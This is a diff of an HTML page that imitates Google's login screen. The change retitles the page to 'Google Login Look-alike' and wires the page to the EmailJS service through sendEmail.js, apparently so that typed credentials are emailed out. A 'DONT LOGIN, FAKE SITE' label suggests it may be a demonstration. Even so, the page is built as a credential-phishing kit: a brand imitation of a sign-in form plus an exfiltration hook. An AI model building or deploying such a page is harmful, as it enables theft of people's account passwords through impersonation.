@@ -3,17 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FAKE Login Look-alike</title>
+    <title>Google Login Look-alike</title>
     <link rel="stylesheet" href="styles.css">
-    <script src="sendEmail.js"></script>
-    <script type="text/javascript"
-        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
-</script>
-<script type="text/javascript">
-   (function(){
-      emailjs.init("9hl9awywx6zp2sVjR");
-   })();
-</script>
 </head>
 <body>
     <div class="container">
@@ -25,18 +16,17 @@
             <input type="password" id="password" name="password" placeholder="Password" required>
             <div class="checkbox">
                 <input type="checkbox" id="rememberMe">
-                <label for="rememberMe">Remember me DONT LOGIN, FAKE SITE v4</label>
+                <label for="rememberMe">Remember me DONT LOGIN, FAKE SITE</label>
             </div>
             <button type="submit">Next</button>
             <div class="links">
                 <a href="#">Forgot password?</a>
                 <a href="#">Create account</a>
             </div>
-            <button class="btn btn-primary" onclick="sendMail()">Submit</button>
         </form>
     </div>
 
     <script src="sendEmail.js"></script>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 </body>
 </html>
